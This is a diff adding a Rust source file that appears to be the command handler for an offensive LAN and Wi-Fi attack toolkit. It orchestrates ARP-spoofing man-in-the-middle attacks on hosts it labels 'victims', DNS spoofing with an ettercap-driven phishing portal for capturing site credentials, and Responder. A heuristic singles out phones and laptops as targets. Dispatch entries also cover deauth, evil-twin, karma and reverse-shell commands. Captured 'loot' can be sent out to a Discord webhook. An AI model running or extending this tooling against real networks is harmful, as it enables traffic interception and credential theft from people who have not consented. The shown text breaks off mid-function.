@@ -1,0 +1,2501 @@
+use std::{
+    fs,
+    io::{BufRead, BufReader},
+    net::Ipv4Addr,
+    path::{Path, PathBuf},
+    time::{Duration, SystemTime, UNIX_EPOCH},
+};
+
+use anyhow::{anyhow, bail, Context, Result};
+use chrono::Local;
+use ipnet::Ipv4Net;
+use regex::Regex;
+use rustyjack_ethernet::{
+    build_device_inventory, discover_hosts, discover_hosts_arp, quick_port_scan, DeviceInfo,
+    LanDiscoveryResult,
+};
+use rustyjack_wireless::{
+    start_hotspot, status_hotspot, stop_hotspot, HotspotConfig, HotspotState,
+};
+use serde_json::{json, Value};
+use walkdir::WalkDir;
+
+use crate::cli::{
+    AutopilotCommand, AutopilotStartArgs, BridgeCommand, BridgeStartArgs, BridgeStopArgs, Commands,
+    DiscordCommand, DiscordSendArgs, DnsSpoofCommand, DnsSpoofStartArgs, EthernetCommand,
+    EthernetDiscoverArgs, EthernetInventoryArgs, EthernetPortScanArgs, EthernetSiteCredArgs,
+    HardwareCommand, HotspotCommand, HotspotStartArgs, LootCommand, LootKind, LootListArgs,
+    LootReadArgs, MitmCommand, MitmStartArgs, NotifyCommand, ProcessCommand, ProcessKillArgs,
+    ProcessStatusArgs, ResponderArgs, ResponderCommand, ReverseCommand, ReverseLaunchArgs,
+    ScanCommand, ScanRunArgs, StatusCommand, SystemCommand, SystemUpdateArgs, WifiBestArgs,
+    WifiCommand, WifiCrackArgs, WifiDeauthArgs, WifiDisconnectArgs, WifiEvilTwinArgs,
+    WifiKarmaArgs, WifiPmkidArgs, WifiProbeSniffArgs, WifiProfileCommand, WifiProfileConnectArgs,
+    WifiProfileDeleteArgs, WifiProfileSaveArgs, WifiRouteCommand, WifiRouteEnsureArgs,
+    WifiRouteMetricArgs, WifiScanArgs, WifiStatusArgs, WifiSwitchArgs,
+};
+use crate::system::{
+    append_payload_log, backup_repository, backup_routing_state, build_loot_path,
+    build_manual_embed, build_mitm_pcap_path, compose_status_text, connect_wifi_network,
+    default_gateway_ip, delete_wifi_profile, detect_ethernet_interface,
+    detect_interface, disconnect_wifi_interface, enable_ip_forwarding, git_reset_to_remote,
+    interface_gateway, kill_process, kill_process_pattern, list_interface_summaries,
+    list_wifi_profiles, load_wifi_profile, log_mac_usage, ping_host, process_running_exact,
+    process_running_pattern, randomize_hostname, read_default_route, read_discord_webhook,
+    read_dns_servers, read_interface_preference, read_interface_stats, read_wifi_link_info,
+    restart_system_service, restore_routing_state, rewrite_dns_servers, rewrite_ettercap_dns,
+    sanitize_label, save_wifi_profile, scan_local_hosts, scan_wifi_networks, select_best_interface,
+    select_wifi_interface, send_discord_payload, send_scan_to_discord, set_default_route,
+    set_interface_metric, spawn_arpspoof_pair, start_bridge_pair, start_ettercap, start_php_server,
+    start_tcpdump_capture, stop_bridge_pair, strip_nmap_header, write_interface_preference,
+    write_wifi_profile, HostInfo, KillResult, WifiProfile,
+};
+
+pub type HandlerResult = (String, Value);
+
+pub fn dispatch_command(root: &Path, command: Commands) -> Result<HandlerResult> {
+    match command {
+        Commands::Scan(ScanCommand::Run(args)) => handle_scan_run(root, args),
+        Commands::Notify(NotifyCommand::Discord(sub)) => match sub {
+            DiscordCommand::Send(args) => handle_discord_send(root, args),
+            DiscordCommand::Status => handle_discord_status(root),
+        },
+        Commands::Responder(sub) => match sub {
+            ResponderCommand::On(args) => handle_responder_on(root, args),
+            ResponderCommand::Off => handle_responder_off(),
+        },
+        Commands::Mitm(sub) => match sub {
+            MitmCommand::Start(args) => handle_mitm_start(root, args),
+            MitmCommand::Stop => handle_mitm_stop(),
+        },
+        Commands::DnsSpoof(sub) => match sub {
+            DnsSpoofCommand::Start(args) => handle_dnsspoof_start(root, args),
+            DnsSpoofCommand::Stop => handle_dnsspoof_stop(),
+        },
+        Commands::Wifi(sub) => match sub {
+            WifiCommand::List => handle_wifi_list(),
+            WifiCommand::Status(args) => handle_wifi_status(root, args),
+            WifiCommand::Best(args) => handle_wifi_best(root, args),
+            WifiCommand::Switch(args) => handle_wifi_switch(root, args),
+            WifiCommand::Scan(args) => handle_wifi_scan(args),
+            WifiCommand::Profile(profile) => match profile {
+                WifiProfileCommand::List => handle_wifi_profile_list(root),
+                WifiProfileCommand::Save(args) => handle_wifi_profile_save(root, args),
+                WifiProfileCommand::Connect(args) => handle_wifi_profile_connect(root, args),
+                WifiProfileCommand::Delete(args) => handle_wifi_profile_delete(root, args),
+            },
+            WifiCommand::Disconnect(args) => handle_wifi_disconnect(args),
+            WifiCommand::Route(route) => match route {
+                WifiRouteCommand::Status => handle_wifi_route_status(root),
+                WifiRouteCommand::Ensure(args) => handle_wifi_route_ensure(root, args),
+                WifiRouteCommand::Backup => handle_wifi_route_backup(root),
+                WifiRouteCommand::Restore => handle_wifi_route_restore(root),
+                WifiRouteCommand::SetMetric(args) => handle_wifi_route_metric(args),
+            },
+            WifiCommand::Deauth(args) => handle_wifi_deauth(root, args),
+            WifiCommand::EvilTwin(args) => handle_wifi_evil_twin(root, args),
+            WifiCommand::PmkidCapture(args) => handle_wifi_pmkid(root, args),
+            WifiCommand::ProbeSniff(args) => handle_wifi_probe_sniff(root, args),
+            WifiCommand::Crack(args) => handle_wifi_crack(root, args),
+            WifiCommand::Karma(args) => handle_wifi_karma(root, args),
+        },
+        Commands::Loot(sub) => match sub {
+            LootCommand::List(args) => handle_loot_list(root, args),
+            LootCommand::Read(args) => handle_loot_read(root, args),
+        },
+        Commands::Process(sub) => match sub {
+            ProcessCommand::Kill(args) => handle_process_kill(args),
+            ProcessCommand::Status(args) => handle_process_status(args),
+        },
+        Commands::Status(StatusCommand::Summary) => handle_status_summary(),
+        Commands::Status(StatusCommand::Network) => handle_network_status(),
+        Commands::Reverse(ReverseCommand::Launch(args)) => handle_reverse_launch(root, args),
+        Commands::System(SystemCommand::Update(args)) => handle_system_update(root, args),
+        Commands::System(SystemCommand::RandomizeHostname) => handle_randomize_hostname(),
+        Commands::Bridge(sub) => match sub {
+            BridgeCommand::Start(args) => handle_bridge_start(root, args),
+            BridgeCommand::Stop(args) => handle_bridge_stop(root, args),
+        },
+        Commands::Autopilot(sub) => match sub {
+            AutopilotCommand::Start(args) => handle_autopilot_start(root, args),
+            AutopilotCommand::Stop => handle_autopilot_stop(),
+            AutopilotCommand::Status => handle_autopilot_status(),
+        },
+        Commands::Hardware(cmd) => match cmd {
+            HardwareCommand::Detect => handle_hardware_detect(),
+        },
+        Commands::Ethernet(sub) => match sub {
+            EthernetCommand::Discover(args) => handle_eth_discover(root, args),
+            EthernetCommand::PortScan(args) => handle_eth_port_scan(root, args),
+            EthernetCommand::Inventory(args) => handle_eth_inventory(root, args),
+            EthernetCommand::SiteCredCapture(args) => handle_eth_site_cred_capture(root, args),
+        },
+        Commands::Hotspot(sub) => match sub {
+            HotspotCommand::Start(args) => handle_hotspot_start(args),
+            HotspotCommand::Stop => handle_hotspot_stop(),
+            HotspotCommand::Status => handle_hotspot_status(),
+        },
+    }
+}
+
+fn handle_scan_run(root: &Path, args: ScanRunArgs) -> Result<HandlerResult> {
+    run_scan_with_progress(root, args, |_, _| {})
+}
+
+fn handle_eth_discover(root: &Path, args: EthernetDiscoverArgs) -> Result<HandlerResult> {
+    let interface = detect_ethernet_interface(args.interface.clone())?;
+    let cidr = args
+        .target
+        .clone()
+        .unwrap_or_else(|| interface.network_cidr());
+    let net: Ipv4Net = cidr.parse().context("parsing target CIDR")?;
+
+    let timeout = Duration::from_millis(args.timeout_ms.max(50));
+    // Try ARP sweep first for low-noise discovery, then augment with ICMP.
+    let mut hosts_detail = Vec::new();
+    if let Ok(arp_result) = discover_hosts_arp(&interface.name, net, Some(50), timeout) {
+        hosts_detail.extend(arp_result.details);
+    }
+    if let Ok(icmp_result) = discover_hosts(net, timeout) {
+        hosts_detail.extend(icmp_result.details);
+    }
+    // Deduplicate while preserving the first discovery method/ttl observed.
+    let mut seen = std::collections::HashSet::new();
+    let mut deduped = Vec::new();
+    for h in hosts_detail {
+        if seen.insert(h.ip) {
+            deduped.push(h);
+        }
+    }
+    let hosts: Vec<Ipv4Addr> = deduped.iter().map(|h| h.ip).collect();
+
+    // Save loot
+    let loot_dir = root.join("loot").join("Ethernet");
+    fs::create_dir_all(&loot_dir).context("creating loot/Ethernet")?;
+    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
+    let file = loot_dir.join(format!("discovery_{}_{}.txt", net, timestamp));
+    let mut out = String::new();
+    out.push_str(&format!("LAN Discovery on {}\n", net));
+    out.push_str(&format!("Interface: {}\n", interface.name));
+    out.push_str(&format!("Timeout: {:?}\n", timeout));
+    out.push_str("\nHosts:\n");
+    for host in &deduped {
+        let ttl_txt = host.ttl.map(|t| format!(" ttl={}", t)).unwrap_or_default();
+        let os_guess = rustyjack_ethernet::guess_os_from_ttl(host.ttl)
+            .map(|s| format!(" os={}", s))
+            .unwrap_or_default();
+        let method = match host.method {
+            rustyjack_ethernet::DiscoveryMethod::Icmp => "icmp",
+            rustyjack_ethernet::DiscoveryMethod::Arp => "arp",
+        };
+        out.push_str(&format!(
+            "{} [{}]{}{}\n",
+            host.ip, method, ttl_txt, os_guess
+        ));
+    }
+    fs::write(&file, out).with_context(|| format!("writing {}", file.display()))?;
+
+    let _ = log_mac_usage(
+        root,
+        &interface.name,
+        "ethernet_discover",
+        Some(&sanitize_label(&net.to_string())),
+    );
+
+    let data = json!({
+        "network": net.to_string(),
+        "interface": interface.name,
+        "hosts_found": hosts,
+        "hosts_detail": deduped.iter().map(|h| {
+            json!({
+                "ip": h.ip.to_string(),
+                "method": match h.method {
+                    rustyjack_ethernet::DiscoveryMethod::Icmp => "icmp",
+                    rustyjack_ethernet::DiscoveryMethod::Arp => "arp",
+                },
+                "ttl": h.ttl,
+                "os_guess": rustyjack_ethernet::guess_os_from_ttl(h.ttl),
+            })
+        }).collect::<Vec<_>>(),
+        "loot_path": file.display().to_string(),
+    });
+    Ok((
+        format!("LAN discovery complete ({} hosts)", hosts.len()),
+        data,
+    ))
+}
+
+fn handle_eth_port_scan(root: &Path, args: EthernetPortScanArgs) -> Result<HandlerResult> {
+    let interface = detect_ethernet_interface(args.interface.clone())?;
+    let target: std::net::Ipv4Addr = if let Some(t) = args.target.as_ref() {
+        t.parse().context("parsing target IPv4")?
+    } else if let Some(gw) = interface_gateway(&interface.name)? {
+        gw
+    } else {
+        bail!("No target provided and no gateway found");
+    };
+
+    let ports: Vec<u16> = if let Some(list) = args.ports.as_ref() {
+        list.split(',')
+            .filter_map(|p| p.trim().parse::<u16>().ok())
+            .collect()
+    } else {
+        vec![
+            22, 80, 443, 53, 445, 3389, 8080, 8000, 8443, 21, 23, 25, 110, 143,
+        ]
+    };
+
+    if ports.is_empty() {
+        bail!("No ports provided for scan");
+    }
+
+    let timeout = Duration::from_millis(args.timeout_ms.max(50));
+    let result = quick_port_scan(target, &ports, timeout).context("running port scan")?;
+
+    // Save loot
+    let loot_dir = root.join("loot").join("Ethernet");
+    fs::create_dir_all(&loot_dir).context("creating loot/Ethernet")?;
+    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
+    let file = loot_dir.join(format!("portscan_{}_{}.txt", target, timestamp));
+    let mut out = String::new();
+    out.push_str(&format!("Port scan on {}\n", target));
+    out.push_str(&format!("Timeout: {:?}\n", timeout));
+    out.push_str("Ports tested:\n");
+    out.push_str(&format!("{:?}\n\n", ports));
+    out.push_str("Open ports:\n");
+    for p in &result.open_ports {
+        out.push_str(&format!("{}\n", p));
+    }
+    if !result.banners.is_empty() {
+        out.push_str("\nBanners:\n");
+        for b in &result.banners {
+            out.push_str(&format!("{} [{}]: {}\n", b.port, b.probe, b.banner));
+        }
+    }
+    fs::write(&file, out).with_context(|| format!("writing {}", file.display()))?;
+
+    let _ = log_mac_usage(
+        root,
+        &interface.name,
+        "ethernet_portscan",
+        Some(&sanitize_label(&target.to_string())),
+    );
+
+    let data = json!({
+        "target": target.to_string(),
+        "open_ports": result.open_ports,
+        "banners": result.banners.iter().map(|b| {
+            json!({
+                "port": b.port,
+                "probe": b.probe,
+                "banner": b.banner,
+            })
+        }).collect::<Vec<_>>(),
+        "loot_path": file.display().to_string(),
+    });
+    Ok((
+        format!("Port scan complete ({} open)", result.open_ports.len()),
+        data,
+    ))
+}
+
+fn handle_eth_inventory(root: &Path, args: EthernetInventoryArgs) -> Result<HandlerResult> {
+    let interface = detect_ethernet_interface(args.interface.clone())?;
+    let cidr = args
+        .target
+        .clone()
+        .unwrap_or_else(|| interface.network_cidr());
+    let net: Ipv4Net = cidr.parse().context("parsing target CIDR")?;
+
+    let timeout = Duration::from_millis(args.timeout_ms.max(200));
+
+    // Combine ARP and ICMP to find hosts
+    let mut details = Vec::new();
+    if let Ok(arp) = discover_hosts_arp(&interface.name, net, Some(50), timeout) {
+        details.extend(arp.details);
+    }
+    if let Ok(icmp) = discover_hosts(net, timeout) {
+        for d in icmp.details {
+            if !details.iter().any(|h| h.ip == d.ip) {
+                details.push(d);
+            }
+        }
+    }
+    let hosts: Vec<Ipv4Addr> = details
+        .iter()
+        .map(|d| d.ip)
+        .collect::<std::collections::HashSet<_>>()
+        .into_iter()
+        .collect();
+
+    let discovery = LanDiscoveryResult {
+        network: net,
+        hosts: hosts.clone(),
+        details: details.clone(),
+    };
+
+    let default_ports = vec![22, 80, 443, 445, 139, 3389, 53, 8080, 8000, 8443];
+    let devices = build_device_inventory(&discovery, &default_ports, timeout)?;
+
+    // Save loot under per-network directory
+    let target_name = net
+        .to_string()
+        .replace(|c: char| !c.is_alphanumeric() && c != '-' && c != '_', "_");
+    let loot_dir = root.join("loot").join("Ethernet").join(&target_name);
+    fs::create_dir_all(&loot_dir).context("creating loot/Ethernet")?;
+    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
+    let path = loot_dir.join(format!("inventory_{}.json", timestamp));
+
+    let serializable: Vec<Value> = devices
+        .iter()
+        .map(|d| {
+            json!({
+                "ip": d.ip.to_string(),
+                "hostname": d.hostname,
+                "os_hint": d.os_hint,
+                "ttl": d.ttl,
+                "open_ports": d.open_ports,
+                "banners": d.banners.iter().map(|b| {
+                    json!({
+                        "port": b.port,
+                        "probe": b.probe,
+                        "banner": b.banner,
+                    })
+                }).collect::<Vec<_>>(),
+                "services": d.services.iter().map(|s| {
+                    json!({
+                        "protocol": s.protocol,
+                        "detail": s.detail,
+                    })
+                }).collect::<Vec<_>>(),
+            })
+        })
+        .collect();
+
+    let output = json!({
+        "interface": interface.name,
+        "network": net.to_string(),
+        "hosts_found": hosts.len(),
+        "devices": serializable,
+        "loot_file": path.display().to_string(),
+    });
+
+    fs::write(&path, serde_json::to_vec_pretty(&serializable)?)
+        .with_context(|| format!("writing {}", path.display()))?;
+
+    let _ = log_mac_usage(
+        root,
+        &interface.name,
+        "ethernet_inventory",
+        Some(&sanitize_label(&net.to_string())),
+    );
+
+    Ok((
+        format!("Inventory complete ({} device(s))", devices.len()),
+        output,
+    ))
+}
+
+fn handle_hotspot_start(args: HotspotStartArgs) -> Result<HandlerResult> {
+    let cfg = HotspotConfig {
+        ap_interface: args.ap_interface,
+        upstream_interface: args.upstream_interface,
+        ssid: args.ssid,
+        password: args.password,
+        channel: args.channel,
+    };
+    let state = start_hotspot(cfg).context("starting hotspot")?;
+
+    let data = json!({
+        "running": true,
+        "ssid": state.ssid,
+        "password": state.password,
+        "ap_interface": state.ap_interface,
+        "upstream_interface": state.upstream_interface,
+        "channel": state.channel,
+    });
+    Ok(("Hotspot started".to_string(), data))
+}
+
+fn handle_hotspot_stop() -> Result<HandlerResult> {
+    stop_hotspot().context("stopping hotspot")?;
+    let data = json!({ "running": false });
+    Ok(("Hotspot stopped".to_string(), data))
+}
+
+fn handle_hotspot_status() -> Result<HandlerResult> {
+    if let Some(HotspotState {
+        ssid,
+        password,
+        ap_interface,
+        upstream_interface,
+        channel,
+        ..
+    }) = status_hotspot()
+    {
+        let data = json!({
+            "running": true,
+            "ssid": ssid,
+            "password": password,
+            "ap_interface": ap_interface,
+            "upstream_interface": upstream_interface,
+            "channel": channel,
+        });
+        Ok(("Hotspot running".to_string(), data))
+    } else {
+        let data = json!({ "running": false });
+        Ok(("Hotspot not running".to_string(), data))
+    }
+}
+
+pub fn run_scan_with_progress<F>(
+    root: &Path,
+    args: ScanRunArgs,
+    mut on_progress: F,
+) -> Result<HandlerResult>
+where
+    F: FnMut(f32, &str),
+{
+    let ScanRunArgs {
+        label,
+        nmap_args,
+        interface,
+        target,
+        output_path,
+        no_discord,
+    } = args;
+
+    let interface_info = detect_interface(interface)?;
+    let target = target.unwrap_or_else(|| interface_info.network_cidr());
+
+    let loot_path = output_path.unwrap_or(build_loot_path(root, &label)?);
+    if let Some(parent) = loot_path.parent() {
+        std::fs::create_dir_all(parent).context("creating loot directory")?;
+    }
+
+    let mut cmd = std::process::Command::new("nmap");
+    if !nmap_args.is_empty() {
+        cmd.args(&nmap_args);
+    }
+
+    // Add stats-every to get progress updates
+    cmd.arg("--stats-every").arg("1s");
+
+    cmd.arg("-oN")
+        .arg(&loot_path)
+        .arg("-S")
+        .arg(interface_info.address.to_string())
+        .arg("-e")
+        .arg(&interface_info.name)
+        .arg(&target)
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::null())
+        .stdin(std::process::Stdio::null());
+
+    let mut child = cmd.spawn().context("failed to launch nmap")?;
+
+    if let Some(stdout) = child.stdout.take() {
+        let reader = BufReader::new(stdout);
+        // Regex to match: "SYN Stealth Scan Timing: About 15.50% done"
+        let re_timing = Regex::new(r"(.*) Timing: About (\d+\.\d+)% done").unwrap();
+
+        for line in reader.lines() {
+            if let Ok(line) = line {
+                if let Some(caps) = re_timing.captures(&line) {
+                    if let (Some(task), Some(pct)) = (caps.get(1), caps.get(2)) {
+                        if let Ok(val) = pct.as_str().parse::<f32>() {
+                            on_progress(val, task.as_str().trim());
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    let status = child.wait().context("failed to wait for nmap")?;
+    if !status.success() {
+        bail!("nmap exited with status {}", status);
+    }
+
+    strip_nmap_header(&loot_path)?;
+
+    let mut discord_sent = false;
+    if !no_discord {
+        discord_sent =
+            send_scan_to_discord(root, &label, &loot_path, &target, &interface_info.name)?;
+    }
+
+    let output_path_str = loot_path.to_string_lossy().to_string();
+    let data = json!({
+        "label": label,
+        "interface": interface_info.name,
+        "target": target,
+        "output_path": output_path_str,
+        "discord_notified": discord_sent,
+    });
+
+    Ok(("Nmap scan completed and loot saved".to_string(), data))
+}
+
+fn handle_discord_send(root: &Path, args: DiscordSendArgs) -> Result<HandlerResult> {
+    let DiscordSendArgs {
+        title,
+        message,
+        file,
+        target,
+        interface,
+    } = args;
+
+    if message.is_none() && file.is_none() {
+        bail!("Either --message or --file must be provided");
+    }
+
+    let embed = build_manual_embed(&title, target.as_deref(), interface.as_deref());
+    let sent = send_discord_payload(root, Some(embed), file.as_deref(), message.as_deref())?;
+
+    let data = json!({
+        "sent": sent,
+        "file": file.as_ref().map(|p| p.to_string_lossy().to_string()),
+    });
+
+    let message = if sent {
+        "Discord notification sent".to_string()
+    } else {
+        "Discord webhook not configured".to_string()
+    };
+
+    Ok((message, data))
+}
+
+fn handle_discord_status(root: &Path) -> Result<HandlerResult> {
+    let configured = read_discord_webhook(root)?.is_some();
+    let data = json!({ "configured": configured });
+    let message = if configured {
+        "Discord webhook configured".to_string()
+    } else {
+        "Discord webhook missing".to_string()
+    };
+    Ok((message, data))
+}
+
+fn handle_responder_on(root: &Path, args: ResponderArgs) -> Result<HandlerResult> {
+    if process_running_pattern("Responder.py")? {
+        let data = json!({ "already_running": true });
+        return Ok(("Responder already running".to_string(), data));
+    }
+
+    let ResponderArgs { interface } = args;
+    let interface = match interface {
+        Some(name) => name,
+        None => detect_interface(None)?.name,
+    };
+
+    let responder_script = root.join("Responder/Responder.py");
+    if !responder_script.exists() {
+        bail!(
+            "Responder script not found at {}",
+            responder_script.display()
+        );
+    }
+
+    let mut cmd = std::process::Command::new("python3");
+    cmd.arg(&responder_script)
+        .arg("-Q")
+        .arg("-I")
+        .arg(&interface)
+        .stdin(std::process::Stdio::null())
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null());
+    cmd.spawn().context("launching Responder")?;
+
+    let data = json!({ "interface": interface });
+    Ok(("Responder started".to_string(), data))
+}
+
+fn handle_responder_off() -> Result<HandlerResult> {
+    match kill_process_pattern("Responder.py")? {
+        KillResult::Terminated => {
+            let data = json!({ "stopped": true });
+            Ok(("Responder stopped".to_string(), data))
+        }
+        KillResult::NotFound => {
+            let data = json!({ "stopped": false });
+            Ok(("Responder was not running".to_string(), data))
+        }
+    }
+}
+
+fn handle_mitm_start(root: &Path, args: MitmStartArgs) -> Result<HandlerResult> {
+    let MitmStartArgs {
+        interface,
+        network,
+        max_hosts,
+        label,
+    } = args;
+    let interface_info = detect_interface(interface)?;
+    let gateway = default_gateway_ip().context("determining default gateway for MITM")?;
+    let network = network.unwrap_or_else(|| interface_info.network_cidr());
+
+    let _ = kill_process("arpspoof");
+    let _ = kill_process("tcpdump");
+
+    let hosts = scan_local_hosts(&interface_info.name)?;
+    let victims: Vec<_> = hosts
+        .into_iter()
+        .filter(|host| host.ip != gateway)
+        .collect();
+    if victims.is_empty() {
+        bail!("No victims discovered on the local network");
+    }
+
+    enable_ip_forwarding(true)?;
+
+    let capped = victims
+        .iter()
+        .take(max_hosts.max(1))
+        .cloned()
+        .collect::<Vec<_>>();
+    let skipped = victims.len().saturating_sub(capped.len());
+
+    if capped.is_empty() {
+        bail!("No victims discovered on the local network");
+    }
+
+    for host in &capped {
+        spawn_arpspoof_pair(&interface_info.name, gateway, host)?;
+    }
+
+    let loot_label = label
+        .or_else(|| Some(network.clone()))
+        .unwrap_or_else(|| "MITM".to_string());
+    let pcap_path = build_mitm_pcap_path(root, Some(&loot_label))?;
+    let pcap_display = pcap_path.to_string_lossy().to_string();
+    start_tcpdump_capture(&interface_info.name, &pcap_path)?;
+    let _ = log_mac_usage(
+        root,
+        &interface_info.name,
+        "ethernet_mitm",
+        Some(&sanitize_label(&loot_label)),
+    );
+
+    let data = json!({
+        "interface": interface_info.name,
+        "victim_count": capped.len(),
+        "victims_skipped": skipped,
+        "gateway": gateway,
+        "pcap_path": pcap_display,
+        "loot_dir": pcap_path.parent().map(|p| p.to_string_lossy().to_string()),
+        "network": network,
+        "max_hosts": max_hosts,
+    });
+
+    Ok(("MITM started".to_string(), data))
+}
+
+fn is_probably_human_device(device: &DeviceInfo) -> bool {
+    let hostname = device
+        .hostname
+        .as_deref()
+        .unwrap_or("")
+        .to_ascii_lowercase();
+    let os = device.os_hint.as_deref().unwrap_or("").to_ascii_lowercase();
+    let services: String = device
+        .services
+        .iter()
+        .map(|s| s.detail.to_ascii_lowercase())
+        .collect::<Vec<_>>()
+        .join(" ");
+
+    let avoid_keywords = [
+        "router",
+        "gateway",
+        "printer",
+        "nas",
+        "camera",
+        "cam",
+        "switch",
+        "ap",
+        "uap",
+        "unifi",
+        "tplink",
+        "tp-link",
+        "mikrotik",
+        "hik",
+        "dvr",
+        "nvr",
+        "tv",
+        "roku",
+        "fire",
+        "chromecast",
+        "sonos",
+        "esp",
+        "shelly",
+        "yeelight",
+        "tuya",
+    ];
+    if avoid_keywords
+        .iter()
+        .any(|k| hostname.contains(k) || os.contains(k) || services.contains(k))
+    {
+        return false;
+    }
+
+    let human_keywords = [
+        "iphone", "ipad", "android", "pixel", "samsung", "oneplus", "mac", "macbook", "imac",
+        "mbp", "windows", "win", "laptop", "notebook", "thinkpad", "dell", "lenovo", "hp",
+        "surface", "pc", "desktop",
+    ];
+    if human_keywords
+        .iter()
+        .any(|k| hostname.contains(k) || os.contains(k) || services.contains(k))
+    {
+        return true;
+    }
+
+    // Port-based hints for user endpoints
+    let ports = &device.open_ports;
+    let human_ports = [
+        139u16, 445, 3389, 62078, 62000, 5000, 7000, 7001, 7100, 5353,
+    ];
+    if human_ports.iter().any(|p| ports.contains(p)) {
+        return true;
+    }
+
+    // Heuristic TTL: very high TTL likely infra, mid/low may be user endpoints.
+    if let Some(ttl) = device.ttl {
+        if ttl >= 240 {
+            return false;
+        }
+        if ttl >= 32 {
+            return true;
+        }
+    }
+
+    false
+}
+
+fn handle_eth_site_cred_capture(root: &Path, args: EthernetSiteCredArgs) -> Result<HandlerResult> {
+    let EthernetSiteCredArgs {
+        interface,
+        target,
+        site,
+        max_hosts,
+        timeout_ms,
+    } = args;
+
+    let site_dir = root.join("DNSSpoof").join("sites").join(&site);
+    if !site_dir.exists() {
+        bail!("DNS spoof site not found: {}", site_dir.display());
+    }
+
+    let interface_info = detect_ethernet_interface(interface)?;
+    let cidr = target.unwrap_or_else(|| interface_info.network_cidr());
+    let net: Ipv4Net = cidr.parse().context("parsing target CIDR")?;
+
+    let timeout = Duration::from_millis(timeout_ms.max(200));
+
+    // Discovery + inventory
+    let mut details = Vec::new();
+    if let Ok(arp) = discover_hosts_arp(&interface_info.name, net, Some(50), timeout) {
+        details.extend(arp.details);
+    }
+    if let Ok(icmp) = discover_hosts(net, timeout) {
+        for d in icmp.details {
+            if !details.iter().any(|h| h.ip == d.ip) {
+                details.push(d);
+            }
+        }
+    }
+    let hosts: Vec<Ipv4Addr> = details
+        .iter()
+        .map(|d| d.ip)
+        .collect::<std::collections::HashSet<_>>()
+        .into_iter()
+        .collect();
+
+    let discovery = LanDiscoveryResult {
+        network: net,
+        hosts: hosts.clone(),
+        details: details.clone(),
+    };
+
+    let default_ports = vec![
+        22, 80, 443, 445, 139, 3389, 53, 8080, 8000, 8443, 5353, 62078,
+    ];
+    let devices = build_device_inventory(&discovery, &default_ports, timeout)?;
+
+    let mut human_devices: Vec<DeviceInfo> = devices
+        .into_iter()
+        .filter(is_probably_human_device)
+        .collect();
+    if human_devices.is_empty() {
+        bail!("No likely human-operated devices detected on the network");
+    }
+
+    human_devices.sort_by_key(|d| d.ip);
+
+    let cap = max_hosts.max(1);
+    let skipped = human_devices.len().saturating_sub(cap);
+    human_devices.truncate(cap);
+
+    // Prepare victims and loot paths
+    let victims: Vec<HostInfo> = human_devices
+        .iter()
+        .map(|d| HostInfo { ip: d.ip })
+        .collect();
+    if victims.is_empty() {
+        bail!("No victims selected for poisoning");
+    }
+
+    let loot_label = format!("{}-{}", site, cidr.replace('/', "_"));
+    let pcap_path = build_mitm_pcap_path(root, Some(&loot_label))?;
+    let pcap_display = pcap_path.to_string_lossy().to_string();
+    let dns_capture_dir = pcap_path
+        .parent()
+        .map(|p| p.join("dnsspoof").join(&site))
+        .unwrap_or_else(|| {
+            root.join("loot")
+                .join("Ethernet")
+                .join("dnsspoof")
+                .join(&site)
+        });
+    fs::create_dir_all(&dns_capture_dir).ok();
+
+    // Clean slate
+    let _ = kill_process("arpspoof");
+    let _ = kill_process("tcpdump");
+    let _ = kill_process_pattern("php -S 0.0.0.0:80");
+    let _ = kill_process_pattern("php");
+    let _ = kill_process_pattern("ettercap");
+
+    enable_ip_forwarding(true)?;
+
+    let gateway = interface_gateway(&interface_info.name)?
+        .or_else(|| default_gateway_ip().ok())
+        .ok_or_else(|| anyhow!("could not determine gateway for {}", interface_info.name))?;
+
+    for host in &victims {
+        spawn_arpspoof_pair(&interface_info.name, gateway, host)?;
+    }
+
+    start_tcpdump_capture(&interface_info.name, &pcap_path)?;
+
+    // Start DNS spoof + portal
+    rewrite_ettercap_dns(interface_info.address)?;
+    start_php_server(&site_dir, Some(&dns_capture_dir))?;
+    start_ettercap(&interface_info.name)?;
+    let _ = log_mac_usage(
+        root,
+        &interface_info.name,
+        "ethernet_site_cred",
+        Some(&sanitize_label(&loot_label)),
+    );
+
+    let victim_ips: Vec<String> = human_devices.iter().map(|d| d.ip.to_string()).collect();
+    let data = json!({
+        "interface": interface_info.name,
+        "network": cidr,
+        "site": site,
+        "victim_count": victim_ips.len(),
+        "victims": victim_ips,
+        "victims_skipped": skipped,
+        "gateway": gateway.to_string(),
+        "pcap_path": pcap_display,
+        "loot_dir": pcap_path.parent().map(|p| p.to_string_lossy().to_string()),
+        "dns_capture_dir": dns_capture_dir.to_string_lossy(),
+        "max_hosts": cap,
+        "dns_spoof": true,
+    });
+
+    Ok(("Site cred capture running".to_string(), data))
+}
+
+fn handle_mitm_stop() -> Result<HandlerResult> {
+    let _ = kill_process("arpspoof");
+    let _ = kill_process("tcpdump");
+    enable_ip_forwarding(false)?;
+
+    let data = json!({ "stopped": true });
+    Ok(("MITM stopped".to_string(), data))
+}
+
+fn handle_dnsspoof_start(root: &Path, args: DnsSpoofStartArgs) -> Result<HandlerResult> {
+    let DnsSpoofStartArgs {
+        site,
+        interface,
+        loot_dir,
+    } = args;
+    let interface_info = detect_interface(interface)?;
+    let site_dir = root.join("DNSSpoof").join("sites").join(&site);
+    if !site_dir.exists() {
+        bail!("Site template not found: {}", site_dir.display());
+    }
+
+    let _ = kill_process_pattern("php -S 0.0.0.0:80");
+    let _ = kill_process_pattern("ettercap");
+
+    let capture_dir = if let Some(dir) = loot_dir {
+        let base = dir.join(&site);
+        fs::create_dir_all(&base).ok();
+        base
+    } else {
+        let base = root.join("DNSSpoof").join("captures").join(&site);
+        fs::create_dir_all(&base).ok();
+        base
+    };
+
+    rewrite_ettercap_dns(interface_info.address)?;
+    start_php_server(&site_dir, Some(&capture_dir))?;
+    start_ettercap(&interface_info.name)?;
+    let _ = log_mac_usage(
+        root,
+        &interface_info.name,
+        "ethernet_dnsspoof",
+        Some(&sanitize_label(&site)),
+    );
+
+    let data = json!({
+        "interface": interface_info.name,
+        "site": site,
+        "capture_dir": capture_dir,
+    });
+    Ok(("DNS spoofing started".to_string(), data))
+}
+
+fn handle_dnsspoof_stop() -> Result<HandlerResult> {
